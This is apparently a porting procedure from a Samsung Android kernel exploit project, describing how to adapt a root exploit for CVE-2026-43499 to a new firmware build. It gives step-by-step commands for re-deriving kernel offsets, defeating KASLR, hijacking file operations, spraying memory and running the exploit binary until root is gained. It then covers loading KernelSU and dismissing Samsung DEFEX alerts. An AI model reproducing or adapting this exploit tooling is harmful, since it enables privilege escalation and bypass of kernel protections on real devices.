# Sibling-build porting procedure

How to port a target profile when the firmware is a **new build for a board
that already has a device-tested profile** — the SM-S937B case (ported from
`psq-S9370ZCS9CZG1` in one session, device-verified the same day). For a new
board, start from [`PORTING.md`](PORTING.md) instead.

The key fact: Samsung rebuilds the same kernel source per regional firmware.
`.text` usually stays symbol-identical to the sibling build while
`.data`/`.rodata` placement shifts. The port then reduces to: prove `.text`
matches, re-derive the few data offsets, regenerate the P0 fingerprint, and
device-test.

## 1. Confirm sibling status

Extract `kernel`, `vmlinux.elf`, `vmlinux.btf` from the new firmware per
PORTING.md §2-3. Compare the kernel release string (`strings kernel | grep
"Linux version"`): same `x.y.z-androidNN-M` base with a different GKI hash
(e.g. `pe17667d` vs `p5a696e2`) means same branch, different revision.

Then nm the ELF and compare every offset in the sibling's `target.h`:

```sh
llvm-nm --numeric-sort vmlinux.elf > vmlinux.nm
grep -E " (_text|call_usermodehelper_exec_work|noop_llseek|copy_splice_read|\
configfs_read_iter|configfs_bin_write_iter|ashmem_ioctl|compat_ashmem_ioctl|\
ashmem_mmap|ashmem_open|ashmem_release|ashmem_show_fdinfo|anon_pipe_buf_ops|\
ashmem_fops|kmalloc_caches|system_unbound_wq|nfulnl_logger|init_task|\
ashmem_misc|root_task_group|selinux_state|sysctl_bootid|worker_thread|\
schedule|__start_ftrace_events|__event_sched_blocked_reason)$" vmlinux.nm
```

Sibling confirmed when every `.text` symbol offset matches. Expect
`kmalloc_caches` and rodata strings to move — that is normal and is exactly
what you re-derive next.

## 2. Re-derive the offsets that move between builds

`KIMAGE_TEXT_BASE` = `_text` address. All offsets below are symbol/address
minus that base.

### `KMALLOC_CACHES_OFF` (nm)

Straight from the symbol table. Zero content in the raw Image is expected
(`__ro_after_init`, filled at boot). A wrong value here fails the pipe cache
gate deterministically (`want=0` or garbage like `0x0028000000000fc3`).

### `SLIDE_NFULNL_LOGGER_NAME_OFF` (raw Image)

Read the first qword of the `nfulnl_logger` object in the raw kernel; it
points at the `"nfnetlink_log"` string:

```python
import struct
p, = struct.unpack_from('<Q', k, NFULNL_LOGGER_OFF)   # k = kernel bytes
s_off = p - KIMAGE_TEXT_BASE
assert k[s_off:k.find(b'\0', s_off)] == b'nfnetlink_log'
```

### `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` (raw Image)

Search the raw kernel for the little-endian qword
`KIMAGE_TEXT_BASE + SYSCTL_BOOTID_OFF`. The correct hit is unique, sits in
the `random_table[]` ctl_table entry, and is immediately preceded by a
pointer to the `"boot_id"` string with `mode == 0444`:

```python
tb = struct.pack('<Q', KIMAGE_TEXT_BASE + SYSCTL_BOOTID_OFF)
# for each hit h: check qword at h-8 points at b'boot_id', and
# struct.unpack_from('<IH', k, h+8) == (0, 0o444)
```

### `SLIDE_TRACEFS_EVENT_ID`

```text
event_index = (__event_sched_blocked_reason - __start_ftrace_events) / 8
event_id    = 20 + event_index      # __TRACE_LAST_TYPE on 6.1 and 6.6
```

Index 89 → id 109 on android15-6.6. 109 is also the `slide.c` default, but
define it explicitly in `target.h`.

### `SLIDE_TRACEFS_WORKER_CALLER_OFF` (disassembly)

```sh
llvm-objdump -d --disassemble-symbols=worker_thread vmlinux.elf
```

Find the blocking `bl schedule`; the macro is the address of the **next**
instruction minus the base (`bl` at `0xd97e8` → `0x000d97ec`).

### Struct layouts (BTF)

`struct page` members hide inside anonymous unions — a naive member walk
misses them; recurse into anonymous struct/union members. Kernel 6.6 split
slab fields out of `struct page` into `struct slab`:

| kernel | slab cache pointer | where |
| --- | --- | --- |
| 6.1 | `page.slab_cache = 0x18` | `STRUCT_SLAB_CACHE_OFF 0x18` |
| 6.6 | `slab.slab_cache = 0x08` | `STRUCT_SLAB_CACHE_OFF 0x08` |

6.6 `struct page`: `compound_head=0x08`, `page_type=0x30`. `configfs_buffer`
carries the bin fields in 6.6 (`page=0x10`, `needs_read_fill=0x50`,
`bin_buffer=0x58`, `bin_buffer_size=0x60`, `cb_max_size=0x64`).
`selinux_state.enforcing` is at +0, so `SELINUX_ENFORCING_OFF` equals the
`selinux_state` symbol offset.

## 3. Physical load address (Qualcomm)

There is **no `sboot.bin`** on Qualcomm — that step in PORTING.md §4 is
Exynos-only. The BL archive holds `uefi.elf` (ELF64 AArch64, entry
`0xA7000000`) and a 32-bit `abl.elf` wrapper; the LinuxLoader is inside a
compressed FV and not trivially disassemblable.

Evidence hierarchy for `P0_KERNEL_PHYS_LOAD`:

1. a device-verified profile for the same board (physical load is a
   board/bootloader property, identical across regional builds);
2. agreement of same-platform profiles (`pa3q`, `q7q`, `psq` all use
   `0xa8000000` with `P0_PHYS_OFFSET 0x80000000`);
3. the memory map (DRAM base `0x80000000`, UEFI resident at `0xa7000000`);
4. runtime log arithmetic from a working run:
   `observed physmap target == DIRECT_MAP_BASE + (LOAD - PHYS_OFFSET)
   + slide + static_offset`.

Beware false positives: `xbl_config.elf` stores values **big-endian**, so
the bytes `00 00 00 a8` are the integer `0xa8`, not the address
`0xa8000000`.

## 4. P0 fingerprint

```sh
perl tools/generate_p0_fingerprint.pl <path>/kernel 0x1f0000 \
  src/targets/<device>-<build>/p0_fingerprint.h
```

The tool verifies all 256 qwords on readback. Expect row 0 word 1 to differ
from every sibling (`0xeb00029f943c…` — the tail varies per build).

On-device the match is normally 7/8 words, not 8: one probed qword contains
a `b` instruction that boot-time patching rewrites to `nop`. `best=7
second=0` is a unique, correct match — do not chase the missing word.

## 5. Target directory, build, artifact

Copy the sibling's `target.h`; change only:

- `BUILD_VARIANT_LABEL` (×2) and `P0_FINGERPRINT_HEADER` (path);
- `BUILD_FINGERPRINT` — read it from `meta-data/fota.zip` in the AP tar
  (`tar -xf AP_*.tar.md5 meta-data --occurrence=1`, then
  `SYSTEM/build.prop` gives brand/name/incremental; `VENDOR/build.prop`
  gives the real `ro.product.*.device`). Ramdisk/vendor fingerprints are
  stale placeholders — compose the runtime one;
- the re-derived offsets from §2.

Add `SLIDE_TRACEFS_EVENT_ID` explicitly. Keep everything else identical.

WSL with only a Windows NDK installed: the NDK's extensionless
`aarch64-linux-android35-clang` is a bash wrapper and works through WSL
interop:

```sh
NDK="/mnt/c/Users/<you>/AppData/Local/Android/Sdk/ndk/<ver>"
CC="$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android35-clang"
make TARGET=<device>-<build> ANDROID_NDK_HOME="$NDK" TARGET_CC="$CC" all release
```

`make release` enforces the fixed 104128-byte size and pads. Copy
`build/<t>/cve-2026-43499-app.release.so` to
`artifacts/<t>/cve-2026-43499-app.so`.

## 6. Support feed

- Add one entry to `support/targets-v3.json` (never touch `targets-v2.json`).
- A `Build.MODEL` must resolve to **exactly one** payload: remove the model
  from the generic/shared entry it used to squat in (the shared payload
  deterministically fails on this board anyway — that is why you are
  porting).
- Validate: `python3 -m json.tool`, then check for duplicate models across
  entries.
- Record the exact artifact size in the feed (the app enforces it).

## 7. Device test runbook

### Prerequisites

```sh
adb shell settings put global settings_enable_monitor_phantom_procs false
```

Stock Android kills a uid's whole phantom-process set beyond 32 processes;
the mm spray forks ~800 children, so with trimming on, the payload tree is
SIGKILLed mid-run (app reports `exit 137` with no per-attempt failure
line). The setting persists across reboots; restore with
`settings delete global settings_enable_monitor_phantom_procs`.
Alternatively run via the app's Shizuku mode (shell uid is exempt).

### Manual run with full logs (recommended for a new port)

```sh
adb push build/<t>/cve-2026-43499-root /data/local/tmp/cve-root
adb push artifacts/<t>/cve-2026-43499-app.so /data/local/tmp/payload.so
adb shell chmod 755 /data/local/tmp/cve-root
adb shell "cd /data/local/tmp && for i in 1 2 3 4 5 6; do \
  EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 \
  ./cve-root --run-payload /data/local/tmp/payload.so /data/local/tmp/cve-root \
  /data/local/tmp/exploit.log >/dev/null 2>&1; \
  grep -q 'root=1' /data/local/tmp/exploit.log && break; sleep 3; done"
```

Do not force `SLIDE_P0_OFFSET` on a fresh boot; let the oracle scan. Within
one boot, forcing the discovered offset speeds up retries.

### Reading the log

| log line | meaning |
| --- | --- |
| `p0 fingerprint ... best=7 second=0 slide=X` | slide found, physically verified |
| `slide-kaslr-ok source=physical/forced` | KASLR base known |
| `app fops stage=trigger-return ... triggered=0` | race miss, retry |
| `cfi restoring misc_fops target=... value=...` | hijack done; check value = base+slide+`ASHMEM_FOPS_OFF` |
| `pipe caches ... selected=ffffff8...` | sane cache pointers ⇒ `KMALLOC_CACHES_OFF` correct |
| `pipe page idx=0 ... match=1` | groomed page is a target slab page; gate passed |
| `phys step cache gate failed slab=... want=...` | groom miss (retry) if `want` is sane; offset bug if `want` is garbage |
| `pipe physrw done=1 root=1 ... uid=2000->0` | success |
| `p0 oracle state dirty ... refusing unsafe retry` | supervisor stopped for safety; relaunch the runner |
| app reports `137`, no `terminated signal=` line | phantom-proc kill, see prerequisites |

### Root + KernelSU

```sh
adb shell "/data/local/tmp/cve-root -c id"        # uid=0(root) ... u:r:kernel:s0
adb push kernelsu/ksud-s25u-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/ksud-s25u-kdp"    # push lands 0664; EACCES otherwise
adb shell "/data/local/tmp/cve-root -c 'echo 1 > /proc/sys/kernel/kptr_restrict'"
adb shell "cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage && chmod 755 /data/local/tmp/.ksud-stage"
adb shell "/data/local/tmp/cve-root --late-load"       # silent on success
adb shell "cat /proc/modules | grep kernelsu; getenforce"   # module Live, Enforcing
```

`.ksud-stage` is consumed by each late-load; recreate it every time.
Everything is per-boot: after a reboot, rerun this section (the slide scan
re-runs automatically).

### DEFEX

Samsung DEFEX may log `Immutable root violation` for the exploit's root
task touching `/data/adb` etc. Cosmetic for this flow; the late-load works
regardless.

## 8. Wrap-up

- Record the device-specific results in `docs/SM-<model>-<build>.md`
  (identity table, moved offsets, validation log excerpt, prerequisites).
- Commit target headers, fingerprint, artifact, feed edit, and the doc.
- If the app repo's `PayloadRepository.kt` was pointed at a fork/branch
  for testing, revert that override after the payload lands somewhere
  permanent.
